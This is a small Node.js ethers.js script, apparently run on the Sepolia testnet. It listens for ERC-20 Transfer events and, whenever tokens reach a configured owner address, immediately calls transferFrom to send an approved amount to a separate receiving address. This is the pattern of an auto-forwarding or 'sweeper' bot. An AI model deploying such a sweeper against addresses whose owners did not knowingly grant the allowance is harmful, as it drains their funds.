const ethers = require("ethers")
const abi = require("./erc20abi")
let details = require("../details")

async function main(){

    let BICOcontractAddress ="0x6C4da7995555F85B6178138091CC513204b830a0" //"0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48"
    let tokenAbi = abi
    let provider = new ethers.providers.WebSocketProvider(
      /*"wss://ethereum-rpc.publicnode.com"*/
      "wss://ethereum-sepolia-rpc.publicnode.com"
    )
    let signer = new ethers.Wallet(process.env.GAS_WALLET_PK, provider)
  
    let contract = new ethers.Contract(BICOcontractAddress, tokenAbi, provider)
    let decimals = await contract.decimals()
    let symbol = await contract.symbol()

    let {owner_address, receiving_address, approve_amount, token_ca} = details
    let contractWithSigner = contract.connect(signer)

    contract.on("Transfer", (from, to, value, event)=>{
        let info = {
            from: from,
            to: to,
            value: ethers.utils.formatUnits(value, decimals)
        }
        
        if(owner_address && signer && to == owner_address){
            let tx = contractWithSigner.transferFrom(owner_address, receiving_address, approve_amount)
            console.log(tx)
            details = {...details, transactions: tx}
        }
        
        console.log(JSON.stringify(info))
    })
    console.log(decimals, symbol)
  }

module.exports = main